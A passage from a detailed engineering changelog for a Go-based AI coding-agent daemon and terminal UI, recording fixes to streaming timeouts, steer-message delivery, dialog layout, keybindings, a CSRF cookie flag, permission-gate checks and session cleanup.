`FixSeededBug`/`GuardNoMetaLeak` each passed cleanly at least once per model. The runs that failed
did so for reasons orthogonal to the adapter: **(1)** `gpt-oss:20b` intermittently emitted malformed
tool-call output (garbled/corrupted argument text, and once its own reasoning prose in place of
JSON) that Ollama's own server-side harmony-format tool-call parser rejected with an HTTP 500 —
`doctorToolCallCheck`'s doc comment (`internal/cli/doctor.go`) already documents `gpt-oss:20b`
tool-calling reliability as a known live-eval variance, predating this item; the adapter correctly
surfaced Ollama's error as an `APIError`/engine error rather than hanging or corrupting state.
**(2)** `qwen3:14b` once wrote a syntactically invalid edit (merged a dict-key-style fragment into
an arithmetic line) — a model-competence miss, not a wire-format problem; every tool call around it
parsed and executed correctly. No failure in either case involved malformed requests from the
adapter, misrouted responses, or incorrect usage/error translation.

---

**Last updated:** 2026-07-16 — shipped **P33.13, P33.14, P33.15, P33.17, P33.18**, clearing the
Tier 2 batch left open by the P33.1-P33.8 shipment below. Implemented by five parallel sub-agents,
each given its own isolated git worktree via `Agent(isolation: "worktree")` rather than hand-grouped
by file the way the P33.1-P33.8 batch was — a deliberate change in method, since four of the five
items touch `internal/tui/tui.go`. All five branches merged into `main` sequentially afterward with
**zero conflicts** (`git merge --no-ff`, auto-merged even where two branches both touched `tui.go`),
verified with a full `go build ./...` / `go vet ./...` / `go test ./...` pass after every merge.

**P33.14** (Tier 2): `gofmt -l ./internal ./cmd` cleaned on the three pre-existing unformatted files
(`internal/checkpoint/checkpoint.go`, `internal/server/auth.go`,
`internal/tool/builtin/knowledge_test.go`), and a `Gofmt check` step was added to
`.github/workflows/ci.yml`'s `build-and-test` job (gated to the `ubuntu-latest` leg, same pattern as
the existing frontend-drift-check step, placed before `Vet`) so unformatted code now fails CI
instead of silently landing again. The workflow's `push`/`pull_request` triggers remain intentionally
disabled (`workflow_dispatch`-only); that's a separate, out-of-scope decision.

**P33.17** (Tier 2): the `↑` input-token count in the TUI's streaming hint no longer shows the
*previous* turn's prompt size while a new turn is streaming. Root cause: `m.inputTokens` is only
refreshed by the `KindTurnDone` handler (`internal/tui/tui.go`), which fires at/near turn end, so for
the whole wait-plus-generation window of a new turn the UI displayed stale data as current. Fix:
added `inputTokensKnown bool`, cleared by `beginStream()` on every new turn (and on `/clear`/session
switch) and set `true` only when `KindTurnDone` assigns the real count; `streamStats()` now leaves
`st.inputToks` at `0` while unknown, and the existing `inputToks > 0` gate in `formatStreamHint`
means the segment simply doesn't render rather than showing a wrong number. Deliberately
provider-agnostic (does not wait on P33.9's real Ollama token counts) and deliberately left the
sidebar CONTEXT bar / cost panel / `renderStats()` alone — those intentionally show a persistent
last-known figure when idle and aren't gated by `m.streaming` the way `streamStats()`'s two call
sites are. New test `TestStreamHintHidesStaleInputTokensAtNewTurn`
(`internal/tui/phase_test.go`) drives a real `KindTurnDone` then a second `beginStream()` and asserts
the `↑` segment is absent until that turn's own usage event lands.

**P33.18** (Tier 2): the inline `@file`/command completion popup no longer shrinks the transcript
viewport when it opens — the last known layout-reflow jump in the normal flow, following the same
compositor pattern P33.6 used for the approval dialog. `fixedH()` no longer reserves
`completionBoxH` and `renderChat()` no longer inserts the popup into its vertical `parts`; the
`applyViewportHeight()` calls that existed only to reclaim space for it (esc-close, ctrl+r, ctrl+k,
`syncCompletion()`) were removed. Unlike the approval dialog, the popup is **non-modal and
composer-anchored** — the user is still typing behind it — so P33.6's `renderOverlay` (centered,
dims everything outside the frame) wasn't reusable as-is. Added a sibling,
`renderAnchoredOverlay(bg, fg string, x, y, width, height int) string` (`internal/tui/dialog.go`),
which positions a layer at an explicit `(x,y)` with no centering and no dimming; a new
`renderCompletionPopup()` computes a bottom-anchored position just above the composer/todo strip,
matching the popup's old visual location. Tests:
`TestCompletionPopupLeavesTranscriptGeometryAlone` (mirrors the P33.6 regression test — transcript
height, `fixedH()`, and `renderChat()` height are unchanged while the popup is open) and
`TestCompletionPopupAnchorsAboveComposer` (`internal/tui/completion_test.go`).

**P33.13** (Tier 2, finishes P33.7): `/persona` now opens instantly with a loading state instead of
fetch-then-open, the one genuinely remote-backed picker P33.7 left behind. Root cause: it dispatches
through the generic `slashResultMsg` path via `handleSlashCommand`, a **value-receiver** method that
can only return a `tea.Cmd` and so cannot mutate the model to open a dialog before the RPC runs.
Added `func (m *model) dispatchSlash(parsed *commands.ParsedCommand) tea.Cmd`
(`internal/tui/tui.go`), a pointer-receiver wrapper that opens the persona picker's loading dialog
synchronously for a bare `/persona` before still returning the async dispatch command; rewired the
three call sites that can trigger it (text-submit, command-palette selection, Tab/Enter completion).
`internal/tui/personapicker.go` now opens via `newPersonaPicker` in the loading state (mirroring
`newSessionPicker`/`newBacktrackPicker`, with `fixedW` to prevent width-snap). Since `/persona`
shares the generic `slashResultMsg` type with every other slash command (unlike the dedicated
`sessionsLoadedMsg`/`backtrackTargetsMsg` used by P33.7's two pickers), the dialog-block
fall-through switch now lets `slashResultMsg` through specifically when the open dialog is the
persona picker, leaving every other dialog's message-swallowing behavior unchanged. Seven new tests
in `internal/tui/picker_loading_test.go` mirror the session/backtrack template: instant-open,
populate-in-place, frame-width stability, fetch-error notice, empty-result notice,
dismiss-before-data, and no-hijack-of-another-dialog.

**P33.15** (Tier 2): three related fixes to the TUI's steer/error path, left over from P33.2.
**(1)** 429 (steer buffer full, retryable) and 404 (run already finished, not retryable) no longer
collapse into the same opaque error. `internal/client/client.go`'s `decodeError` now returns a typed
`client.StatusError{Code int; Msg string}` instead of a bare `fmt.Errorf` (same message text,
purely additive) so callers can `errors.As` to recover the HTTP status without string-parsing.
**(2)** A failed steer POST no longer visually tears down a live run. Previously any error reaching
`internal/tui/tui.go`'s `case errMsg:` set `m.streaming = false` unconditionally, so a transient
steer-POST failure on a still-live stream made the whole run look finished. A new `steerFailedMsg`
type, returned by `sendSteerCmd` and by `approval.go`'s denial-feedback send instead of `errMsg`,
resolves only its one failed entry out of `pendingSteers` and leaves `m.streaming`, `m.queued`, and
every other in-flight steer untouched; it branches on the recovered `StatusError` code (404 →
requeue via the same path `KindSteerUnconsumed` uses, not shown as an error; 429 → dim "server busy
— try again"; other → generic "steer not delivered"). `errMsg`'s original full-teardown behavior is
unchanged for errors that actually end the stream. **(3)** The approval-denial-feedback steer
(`"The user denied the %s call. Feedback: …"`, `internal/tui/approval.go`) is now origin-tagged
rather than indistinguishable from a user-typed steer: `pendingSteers []string` became
`pendingSteers []pendingSteerEntry{text, origin steerOrigin}` (`steerOriginUser` /
`steerOriginDenialFeedback`), threaded through `resolvePendingSteer`/`requeueSteer`. If a
denial-feedback steer ever comes back unconsumed via `KindSteerUnconsumed`, it now renders a
"feedback not delivered" note instead of being pushed into `m.queued` and sent to the model as if
the user had typed that system-phrased sentence. Tests added/extended across
`internal/client/client_test.go`, `internal/server/steer_test.go` (a new
`TestSteerFullReturns429RetryableStatusError` floods the size-8 steer buffer over a real HTTP round
trip), and `internal/tui/steer_test.go` (five new cases: 404/429/generic steer failures, other
pending steers left alone, an already-resolved race, denial-feedback non-requeue).

---

**Last updated:** 2026-07-15 — shipped **P33.1-P33.8**, the whole of the P33 batch's Tier 1 and
Tier 2 (both robustness fixes and all six UX items), leaving only the three Tier 3 items (P33.9
native Ollama adapter, P33.10 keep-alive/pre-warm, P33.11 transient slash panels) open. The batch
was implemented by parallel sub-agents grouped so no two concurrently edited the same file, in four
rounds: (P33.1, P33.5) → P33.2 → P33.3 → (P33.4) → (P33.6, P33.7) → P33.8. Verified at the end
with `go build ./...`, `go test ./...` (fully green), and `go test -race` over
`internal/tui`, `internal/server`, `internal/engine`, `internal/eval`, `internal/api`.

A cross-cutting result worth recording ahead of the per-item notes: **four of the eight items had
materially inaccurate roadmap descriptions**, and in three cases implementing the item exactly as
written would have shipped a non-fix or a visibly wrong UI. P33.1's stated root cause was wrong
(the error envelope decoded *successfully*, so it was dropped one step earlier than the
`json.Unmarshal` failure path the item blamed — fixing only the documented path would have fixed
nothing); P33.4's phase-end condition missed the tool-call-first case and its tok/s data source
(`liveText`) is reset every tool round; P33.7's picker inventory named two pickers that aren't
remote-backed and one that doesn't exist, while omitting the persona picker; P33.3's proposed
`Index` wire field proved unnecessary. The lesson for future batches: an assessment that reads code
carefully enough to cite line numbers can still mis-state *mechanism*, and the line-number
precision is not evidence the diagnosis is right. Each item below records its own correction.

**P33.1** (Tier 1): the OpenAI and Anthropic adapters no longer kill long streams, and mid-stream
Ollama errors no longer vanish. **(a)** Both adapters built `http.Client{Timeout: 10 * time.Minute}`
(`openai.go:66`, `anthropic.go:77` — the item only predicted the OpenAI one; Anthropic had the
identical bug). Go's `Client.Timeout` bounds the *entire* request including streamed-body reads, so
any sufficiently long agentic turn on a slow local model died mid-stream as an unrecoverable
transport error. Rather than duplicate the fix, `internal/provider/sse` (the P32.11 shared-plumbing
package) gained `NewStreamingClient()` (`sse.go:38-52`): `Timeout: 0` over a clone of
`http.DefaultTransport` (preserving proxy/TLS/pooling defaults) with `ResponseHeaderTimeout = 5m`;
both adapters now call it. Interrupts already rode context cancellation
(`http.NewRequestWithContext`), which is the correct seam. The 5-minute header timeout still bounds
a server that accepts a connection and never replies, and critically stops at the headers so it
cannot kill a long stream; a cold Ollama backend pulling a large model into VRAM can take minutes to
send them. The item's optional idle-read watchdog was **deliberately not implemented**: Ollama sends
headers immediately and then legitimately goes silent for minutes during prompt eval, so an
idle-read timer would reintroduce exactly the false-positive kill this item exists to remove.
**(b)** The item diagnosed mid-stream `{"error": ...}` envelopes as being lost to `consume()`'s
silent `continue` on `json.Unmarshal` failure. That was wrong: Go ignores unknown fields, so the
envelope decoded *successfully* into an empty chunk and was discarded earlier. The fix therefore
covers both paths — the chunk struct gained `Error json.RawMessage`, and a non-empty message on
successful decode emits `EventError` and returns; on decode failure, `streamErrorMessage(data)`
re-decodes just the envelope and only errors if it yields a message, otherwise `continue`s as
before. `errorMessage()` (`openai.go:293-317`) handles both spellings — Ollama's bare string
(`{"error":"..."}`) and OpenAI/vLLM's object (`{"error":{"message":...}}`) — degrading an
object-without-message to its raw JSON and returning `""` for absent/`null`/non-string-non-object,
so benign noise stays skipped. Anthropic's mid-stream error handling was already correct
(`anthropic.go:472-474`), making (b) genuinely OpenAI-only. Tests:
`TestStreamingClientHasNoWholeRequestTimeout` (both adapters, asserts config rather than sleeping),
`TestStreamOutlastsResponseHeaderTimeout` (fake SSE server dribbling chunks past a 50ms injected
header timeout, proving the bound stops at headers), and a 7-case `TestMidStreamError` table
covering both spellings, object-without-message, an undecodable chunk carrying an error, and three
benign-noise cases asserting the stream still completes. The error tests were verified as genuine
regressions against the pre-fix code.

**P33.2** (Tier 1): steer messages can no longer be silently lost. The engine drained `steerCh` only
between tool rounds, so a steer sent while the model was generating its final answer — or during a
text-only run — was never injected, never echoed, and was dropped when the handler deleted
`pendingSteers` on return. **No engine change was needed**: the between-rounds drain is correct;
the bug was entirely that nobody drained afterwards. New wire event `api.KindSteerUnconsumed`
(`"steer_unconsumed"`, `internal/api/api.go:159-166`), terminal, carrying the original text, emitted
once per leftover steer before the stream closes — purely additive (a run with nothing left over
never emits it; a client ignoring the kind behaves as today), added to the wire-value lock test and
the web UI `Event` union (`types.ts:298`, types-only, no `dist/` rebuild). The drain race is fenced
by replacing the raw `chan string` in `pendingSteers` with a `steerBox` (`messages.go:628-680`) —
the channel plus a mutex-guarded `closed` flag; `handleSteer` goes through `offer()`, the end-of-run
drain calls `close()` which sets the flag under the lock *then* drains. This yields no
double-delivery (`eng.Run` has returned, so the drain is the only reader) and, more importantly, no
lost message: without the fence a steer accepted with a `204` in the window between the drain and
the deferred `pendingSteers.Delete` would land in a channel nobody reads again — a narrower
instance of the very bug being fixed. A steer for a finished run now returns 404 rather than a lying
204 (buffer-full is 429). Cancel-path split: the **server always emits** the event, since it cannot
distinguish an Esc from a dropped connection (that is client state); the **TUI decides** — normal
end requeues into `m.queued` per TQ8 semantics (auto-sending next), while after an explicit
interrupt it renders a dim `⇢ steer not delivered (interrupted): <text>` note instead, because
auto-sending a turn into a run the user just braked on is the same surprise TQ8's own
`m.queued = nil` avoids. Either way the text stays on screen, so it is never *silently* lost. A
daemon that never emits the event (older build, or an event the SSE ring buffer dropped) is handled
too: leftover echoes are treated as unconsumed at `streamClosedMsg` rather than dangling forever.
TUI side adds send-time local echo (dimmed `⇢ steer ▸ …`), `resolvePendingSteer`/`requeueSteer`, and
an `interrupted` flag. `internal/eval` gained `TurnResult.Steers`, `Result.AllSteers`,
`ExpectSteerInjected`, `ExpectNoSteerInjected`. Tests: `TestScenario_SteerNeverConsumedOnTextOnlyRun`
(the done-when case: not injected *and* still on the channel, i.e. it didn't vanish) and
`TestScenario_SteerConsumedBetweenToolRounds` (injected exactly once, channel empty → no double
delivery); `internal/server/steer_test.go` (`TestSteerBoxFencesLateOffers` for ordering/full/
post-close/idempotent-close, and an end-to-end `TestSteerUnconsumedHandedBackAtRunEnd` over the real
HTTP/SSE seam); `internal/tui/steer_test.go` for echo-resolve, requeue-and-auto-send,
interrupt-note, and the stream-close fallback. Golden transcripts byte-identical.

**P33.3** (Tier 2): the pending tool card is now visible while the model is still generating the
call's arguments — on a local model frequently the longest phase of an agentic turn, and previously
covered only by the shimmer phrase, with the P21.2 card on screen for the milliseconds between
stream end and execution start. New `provider.EventToolUseStart` (`provider.go:141`) reuses the
existing `Event.ToolUse *ToolUseBlock` payload rather than widening the struct: `Name` always set,
`ID` when the provider has assigned one that early, `Input` always empty; the terminal
`EventToolUse` is unchanged. Emitted by OpenAI on the first delta carrying a name (`openai.go:424`,
guarded by a new `toolAccum.announced` so a re-sent name can't announce twice) and by Anthropic at
`content_block_start` for `type=="tool_use"` (`anthropic.go:412`). Engine forwards it as
`KindToolCallStart` (`engine.go:155,936`); `toAPIEvent` maps kinds by string, so **no server change
was required**. **The item's proposed `Index` field proved unnecessary** and was deliberately not
added to the engine/api wire: the TUI reconciles with the two-tier rule `resolveToolCard` already
had — exact ToolID match, then oldest still-provisional card with a matching name — and that FIFO
tier turns out to be load-bearing rather than legacy, because the OpenAI wire format can name a call
in an earlier delta than the one carrying its ID (so the start is often ID-less while the terminal
event is not). Starts and calls are both emitted in stream order, so the i-th start of a name pairs
with the i-th call; on reconcile the card is re-keyed in place (`rekeyPendingTool`, preserving
`pendingToolOrder` position) so the later `KindToolResult` — which looks up by ID — still resolves
it. Duplicate prevention: a start creates a card only if `ev.Tool != ""` and no card exists under a
repeated *non-empty* ToolID (deduping by name would wrongly collapse two legitimate ID-less starts);
`KindToolCall` appends only when reconciliation misses. The start deliberately does not touch
`m.tools` or `pendingReadPaths` — `KindToolCall` still owns both, so nothing double-counts. Orphans
are covered for free: provisional cards live in the same `pendingTools`/`pendingToolOrder`
structures, so both existing `resolveStuckToolCards` nets (`KindError` and `streamClosedMsg`, the
latter being P33.5's interrupt path) cover them unchanged, and `card.call` is set to the name header
at start time so a stuck render still names the tool. Rendering via
`renderToolCardStart`/`renderToolCardStartCall` (`toolview.go:81`) and a `toolCard.awaitingCall`
flag; incremental argument display remains explicitly out of scope. Tests span adapter (both),
engine forwarding, and six TUI cases including the late-ID rekey, the dedupe rules, stuck resolution
on cancel *and* error, and an additive-only test proving a producer emitting no start event behaves
exactly as pre-P33.3. **No golden regeneration was needed** — the eval harness's deterministic
adapter never emits the new event and `eval.go` records only Text/ToolCall/Steer/Guard kinds.

**P33.4** (Tier 2): the streaming status is phase-aware and token/tok-s feedback is continuous.
Previously `m.status` was set once to `"thinking…"` at send and never changed, showing the identical
shimmer for model-load, prompt-eval, and generation — on the target hardware (RX 7900 GRE 16GB) a
10-60s wait, plus a cold reload if Ollama's 5m `keep_alive` lapsed. `formatStreamHint` (`flavor.go:
205-247`) now takes a `streamStats` struct and renders ` · 12s · ↑4.2k · ↓~380 · ~14 tok/s`, with
the `~` markers driven by `st.estimated` and zero segments dropped rather than printed as `0`. New
`statusWaiting`/`statusGenerating`, `phaseStatus()`, `beginStream()`, `markModelOutput(n)`, and
`streamStats()` (`tui.go:934-999`); the tail (`refresh()`), the sidebar section title
(`WAITING`/`GENERATING`, so it cannot contradict the bar), and `renderInputArea` all read from them,
and the hint now renders for the whole streaming duration rather than only in the no-live-text
branch. `beginStream()` also zeroes `streamStart`, fixing a pre-existing one-frame glitch where the
elapsed readout quoted the *previous* run's clock. `approval.go:246` resumes with `m.phaseStatus()`
instead of a hardcoded `"thinking…"`. **Two corrections to the item's text, both made for
truthfulness.** First, it says the phase ends at "the first `KindText`/`KindThinking` delta" — that
misses the tool-call-first case, where P33.3's `preparing read_file…` card would sit on screen
directly below a bar still insisting "waiting for first token". `markModelOutput` is therefore also
called from `KindToolCallStart` *and* `KindToolCall` (the latter covering a daemon emitting no start
event), with `n=0` since a tool name isn't measurable output bytes; the phase ends at *any* first
model output. Second, it says to derive tok/s from "liveText byte growth" — not viable, because
`flushLiveText` resets `liveText` at every tool round and at turn end, so the counter would drop to
zero mid-run, defeating the item's own "continuously visible" goal; `outBytes` accumulates over the
run instead and counts reasoning deltas as output (they are output tokens). Additionally, tok/s is
measured from `firstTokenAt`, not `streamStart`: averaging a 60s cold-load into the rate would
report a throughput the model never ran at. The heuristic (`bytesPerTokenEstimate = 4`) exists in
exactly one place — `model.streamStats()` — which sets `estimated: true`; the formatter and both
render sites are already estimate-agnostic, so P33.9 assigns real per-delta counts and clears the
flag with no caller changes. Six tests in `phase_test.go`, including
`TestStreamPhaseEndsAtProvisionalToolCard`, `TestStreamStatsRateExcludesTheWait`, and a
`formatStreamHint` table pinning the reported-counts case that renders without tildes.

**P33.5** (Tier 2): a single Esc interrupts while streaming, matching Claude Code (Aegis previously
required Esc-Esc, pure friction given the first Esc did nothing else). The streaming Esc branch
(`tui.go:1344-1371`) no longer arms `escPending`: an empty composer interrupts immediately
(`m.cancel()` plus `m.queued = nil` for the TQ8 discard); a composer with text has the first Esc
reset the textarea and return early with the run still streaming, so the next Esc hits the
now-empty case and interrupts — preserving "clear input". The same-frame `alt+esc` decoder quirk is
preserved and sharpened: with text, a coalesced double-tap falls through the clear into the cancel,
meaning clear *and* interrupt rather than just clear. Case distinction is `m.streaming` plus
`strings.TrimSpace(m.ta.Value()) != ""`, mirroring the emptiness test the idle branch already used.
Esc-Esc while *idle* still opens the P22.3 backtrack picker, unchanged and still covered by the
pre-existing `TestEscEsc_EmptyInputNotStreaming_OpensBacktrackPicker`. The now-unreachable
`⚠ ESC again to stop` hint was dropped; `keymap.go:47` `Interrupt` help became
`"interrupt run / clear input (×2 when idle: backtrack)"`, which the F1 overlay and `/help` pick up
automatically via `helpEntries()`. `docs/tui-guide.md` gained a previously-undocumented `Esc Esc`
idle-backtrack row. New `interrupt_esc_test.go` covers all three cases plus the alt+esc quirk.

**P33.6** (Tier 2): the approval dialog composites over the chat instead of reflowing the frame —
the single most jarring layout jump in the normal flow and the likely main contributor to the
"disjointed" feel during permission-heavy runs. `render` (`tui.go:3503-3511`) now routes the
approval through the existing P16.6 `renderOverlay` *before* the help/quit/dialog switch, so a
dialog opened on top of a pending approval still wins and the approval stays visible (dimmed)
behind it, as before. The approval branch was removed from `fixedH()` and `renderChat()`'s `parts`,
and the `applyViewportHeight()` call at `KindApprovalRequest` deleted, along with the three in
`handleApprovalKey`/`answerApproval` that existed only to re-make room for the inline dialog.
`renderApprovalDialog` returns `dialogFrame(...)` content bounded by `approvalDialogW()` at
`min(width-6, 74)`, matching the list pickers. Modality is untouched (same key interception, same
`ta.Blur()`, same fall-through scrolling), so P25.4a's semantics carry over unchanged; `fixedH()` no
longer renders the dialog just to measure it, making layout passes cheaper. Status line reworded to
`⏸ respond to the approval dialog` since "above" is no longer accurate. Trade-off worth recording:
the overlay is centred, so it now occludes the middle of the transcript where previously the
(shorter) transcript was fully visible above it; the docs' claim that the transcript behind the
dialog is still scrollable is now literally accurate. `approval_test.go` gained transcript/`fixedH`/
chat-height stability assertions and overlay-vs-chat-frame placement.

**P33.7** (Tier 2): the remote-backed pickers open instantly with a loading state instead of
fetch-then-open, which previously produced zero visible reaction until the RPC returned. `dialog.go`
gained `noticeItem`/`noticeRow` (a non-selectable placeholder), `listDialog.loading`/`fixedW`,
`newLoadingDialog`, `setLoadingFrame`, `setItems`, `setNotice`, and a shared `dialogListH`;
`Update`'s `enter` swallows a notice row. The session (Ctrl+Y) and backtrack (Esc-Esc) pickers split
into `newXPicker(termW, termH, frame)` + `xPickerItems(...)` + `xPickerH(termH, n)`, opening
immediately and returning `tea.Batch(fetch, m.sp.Tick)`. **The item's picker inventory was
inaccurate** and is corrected here: `/session` never opened a picker at all (`cmdSession` prints
text — only Ctrl+Y opens one), and `/timeline` (`m.timelineEntries`) and the model picker
(`modelcatalog.Curated()`) are backed by *local* data, so there is no RPC to wait on and nothing to
load. The genuinely remote-backed set is session, backtrack, and the **persona picker**
(`/persona` → `client.ListPersonas`), which the item omits; the first two are done and persona is
deferred to its own item (see roadmap P33.13) because it opens through the generic `slashResultMsg`
path and would need a pre-dispatch hook in `handleSlashCommand` — a value receiver returning
`tea.Cmd`, so it cannot mutate the model — which is a real refactor rather than this item's scoped
S effort. Two non-obvious blockers had to be fixed: the dialog block returns early for *every*
message, so the data handlers were unreachable and the spinner would have spun forever (it now falls
through for `sessionsLoadedMsg`/`backtrackTargetsMsg`, `tui.go:1294-1303`); and the spinner tick is
only re-queued while `m.streaming`, which neither picker path is, so the tick is claimed and
re-queued in the dialog block while `loading`, dying naturally once data lands or the dialog closes.
Dismiss-before-data is guarded by `awaitingPicker(kind)`, which requires the dialog to still be open
*and* still be that kind — late data for a dismissed picker is dropped (errors still fall back to
the old toast) and data for a picker replaced by another dialog cannot leak into it. Flicker is
handled by `fixedW`: a dialog frame shrink-wraps its rows, so opening on a narrow "loading…" row
would snap width the instant real rows arrived; these two pickers are held at their configured width
(74/76) across loading → populated → notice, so only height changes. Beyond that, bubbletea's
framerate-limited renderer coalesces a sub-frame-time fetch, so a fast daemon never flushes the
loading frame at all. User-visible change worth noting: "no sessions to switch to" / "no checkpoints
yet" are now in-dialog rows requiring Esc rather than a toast with nothing opening — intentional, to
avoid an open-then-close flash. Ten new tests in `picker_loading_test.go`.

**P33.8** (Tier 2): Enter and Alt+Enter swap during streaming — **Enter now queues, Alt+Enter
steers** — chosen by the user from the item's option list. Aegis previously inverted Claude Code's
default, putting the riskier action (mid-run injection, which per P33.2 could until today even
vanish) on the reflex keypress, signalled only by a border colour and placeholder text. `tui.go:
1631` (`enter`) appends to `m.queued` with TQ8 semantics and returns no command; `tui.go:1672`
(`alt+enter`) appends to `m.pendingSteers` and returns `m.sendSteerCmd(text)`; idle behaviour is
unchanged. P33.2's machinery survived the swap intact because its echo/requeue paths were wired to
`m.pendingSteers`, not to a key — moving the append plus `sendSteerCmd` across carried `KindSteer`
resolve, `KindSteerUnconsumed` requeue, the `interrupted`-note path, and the stream-close fallback
unmodified, and all four pre-existing P33.2 tests pass with only the driving keypress swapped. The
visual signal was **retired rather than relocated**: the amber (`colWarning`) border existed to warn
"Enter injects into a live run", and since steering is no longer a mode the composer sits in but a
one-shot deliberate keypress, that warning had nothing left to attach to. The streaming composer now
uses `colTextMuted` (it recedes, because Enter holds rather than sends) with placeholder
`Queue the next message… (alt+enter steers)`, naming the Enter action and documenting the opt-in;
streaming itself is still signalled by P33.4's phase status bar. `setSteerMode` → `setQueueMode`.
**Breaking config change:** `keymap.go`'s `Queue` field is renamed `Steer` (the `alt+enter` binding
it holds now steers) and the `bindingsByName` key `"queue"` → `"steer"`, so any user config with
`tui.keybindings.queue: [...]` now fails fast at startup with `unknown action(s): queue` —
consistent with the existing fail-fast design, and the error names the typo, but it is user-visible
and was not anticipated by the item's Effort-S description. Docs: `keymap.go` help text (feeding
both F1 and `/help` through `helpEntries()`), `docs/tui-guide.md:89-91` shortcut table and its
rewritten queueing section, a new "Steering a running turn" section documenting Alt+Enter, the
`⇢ steer ▸` echo, requeue-on-unconsumed, and the interrupted-note exception (steering had been
entirely undocumented before), and `docs/configuration.md:367`'s `tui.keybindings` action list. New
`TestEnterWhileStreamingQueues` and `TestQueueModeSignalMatchesEnterAction`, the latter
mutation-checked by forcing `colWarning` back in to confirm it isn't a silent pass.

**Prior batch:** shipped **P32.9-P32.11**, the three Tier 4 parked items from the
2026-07-15 application review, at the user's explicit request (they were parked precisely because
they had no concrete trigger, per the roadmap's "check with the user before starting any of these"
note — the user's ask to fix them directly is that trigger). Also shipped **P32.2-P32.8** the same
day, closing out Tier 1, Tier 2, and the sole Tier 3 item (P32.1 shipped earlier the same day; see
below).

**P32.9** (Tier 4): the skills and persona frontmatter parsers no longer diverge.
`skills.parseSkill` (`internal/skills/skills.go`) previously extracted `name`/`description` with a
hand-rolled per-line `strings.Cut(line, ":")` loop — it worked only because skills frontmatter had
exactly two scalar fields, and would have silently mis-parsed a quoted value containing a colon or
any multi-line/structured value. It now unmarshals the frontmatter block as real YAML
(`go.yaml.in/yaml/v3`, already a dependency via `internal/persona/load.go`) into a `yaml.Node`
mapping and reads `name`/`description` off that, preserving the pre-existing case-insensitive key
matching that a typed-struct decode (persona's approach) doesn't give for free. `skills.go`'s own
`splitFrontmatter` — which, unlike persona's, handles a BOM prefix — was left as-is; only the
field-extraction step changed. Malformed YAML falls back to the default name/empty description,
matching the old parser's silent-skip behavior (`parseSkill`'s signature wasn't changed to return an
error). Added `TestParseFrontmatterQuotedColon`, `TestParseFrontmatterMultilineValue`,
`TestParseFrontmatterCaseInsensitiveKeys`, and `TestParseFrontmatterMalformedYAML`
(`internal/skills/skills_test.go`) — the first two fail against the pre-fix line-parser. **P32.10**
(Tier 4): the web UI's CSRF cookie can now carry `Secure` behind a reverse proxy that terminates TLS.
`ServerConfig` (`internal/config/config.go`) gained `TrustProxyHeaders` (`trust_proxy_headers`,
default `false`) — an explicit opt-in, since trusting `X-Forwarded-Proto` unconditionally would let
any direct caller spoof HTTPS and get a cookie attribute meant to reflect the real transport.
`handleWebUI`'s cookie (`internal/server/webui.go`) now sets `Secure: r.TLS != nil ||
(s.cfg.Server.TrustProxyHeaders && r.Header.Get("X-Forwarded-Proto") == "https")` — the flag is only
safe to enable when the daemon sits behind an operator-controlled proxy that strips/overwrites any
client-supplied `X-Forwarded-Proto` before forwarding, which the new field's doc comment spells out.
Added `TestWebUICSRFCookieSecureFlagTrustProxyHeaders` (`internal/server/webui_test.go`) with both
the positive case (flag on + forwarded-proto header → `Secure`) and the regression guard (flag off,
the default, + spoofed header on a plaintext request → `Secure` stays false). **P32.11** (Tier 4):
the Anthropic and OpenAI provider adapters now share their SSE-consumption plumbing instead of each
reimplementing it. New package `internal/provider/sse` (`sse.go`) holds `NewScanner` (the identical
pre-sized `bufio.NewScanner` + 64KiB/4MiB `Buffer` call both adapters built independently),
`NewEmitter`/`Emit` (the identical `select { case out <- ev: … case <-ctx.Done(): … }`
channel-send-with-cancellation closure both adapters defined locally), and
`HandleErrorResponse` (the identical non-200-response `LimitReader`+`ReadAll`+`NewHTTPError`+
body-close handling both `Stream` methods repeated). `internal/provider/anthropic/anthropic.go` and
`internal/provider/openai/openai.go` now call through these instead of duplicating the logic; the
roadmap note's guess that retry/backoff might also be duplicated didn't hold up — neither adapter
implements retry/backoff today, so none was added. Each adapter's per-adapter error-message prefix
(`"anthropic: read stream: %w"` / `"openai: read stream: %w"`) was deliberately left inline rather
than forced through a shared wrapper, since a one-line prefix parameter wouldn't have reduced real
duplication. Pure internal refactor — `provider.Adapter` and all wire-format/event behavior are
unchanged; both adapters' existing test suites (`anthropic_test.go`, `openai_test.go`, including
ctx-cancellation-mid-stream and non-200 coverage) pass unmodified. Verified with `go build ./...` and
`go test ./...` (full suite green) plus `go test -race ./internal/provider/...`.
**P32.2** (Tier 1):
`ContextualGate.Check` (`internal/permission/contextual.go:105`) now calls
`tool.EffectiveCapability(t, input)` instead of the static `t.Capability()`, matching the two call
sites (`permission.Gate.Check`, `engine.serializeTool`) that already got this right — a future tool
that narrows into/out of `CapWrite`/`CapNetwork` via `CapabilityFor` will now still be caught by the
egress-then-write and network-allowlist rules instead of silently bypassing them. Added
`TestNetworkAllowListUsesEffectiveCapability` (`internal/permission/contextual_test.go`), which fails
against the pre-fix code. **P32.3** (Tier 1): session deletion no longer leaks checkpoint snapshots
or `bg_events` rows. `session.Store` gained a `CheckpointCleaner` interface and
`SetCheckpointCleaner` (`internal/session/session.go`), wired from `server.New` right after the
checkpoint store is constructed; `Store.Delete` and `Store.Prune` now delete `bg_events` rows inside
their existing transaction and fan out to the checkpoint cleaner afterward (`Prune` collects the
about-to-be-pruned session IDs before its `DELETE`, then calls the cleaner per ID once the
transaction commits) — previously only the HTTP `handleDeleteSession` handler did the checkpoint
half, so the TTL auto-pruner and `/sessions/prune` silently left checkpoint snapshots (up to 16MiB
each, uncapped count) and all `bg_events` rows behind forever, undermining the one feature
(`cleanup.session_ttl_days`) specifically built to bound DB growth. `handleDeleteSession` was
simplified to drop its now-redundant direct `checkpoints.DeleteForSession` call. Added
`TestDeleteRemovesBGEventsAndCheckpoints` and `TestPruneRemovesBGEventsAndCheckpoints`
(`internal/session/session_test.go`) using a `fakeCheckpointCleaner`. **P32.4** (Tier 1): debate
`max_rounds` is now hard-capped regardless of caller input. Added `debate.MaxRoundsCeiling = 10`
(`internal/debate/debate.go`), applied in `withDefaults` (the single choke point both the `agent`
tool's debate mode and the `/debate` HTTP handler already funnel through via `debate.Run`) and
mirrored in `executeDebate`'s own pre-`Run` context-timeout calculation
(`internal/tool/builtin/agent.go`), which previously scaled `maxAgentDuration*(2*maxRounds+2)` off
the same unclamped value. Previously nothing bounded `max_rounds` end-to-end — not the JSON schema,
not `DebateRequest.MaxRounds`, not the timeout math — and `budgetExhausted` only helps when a
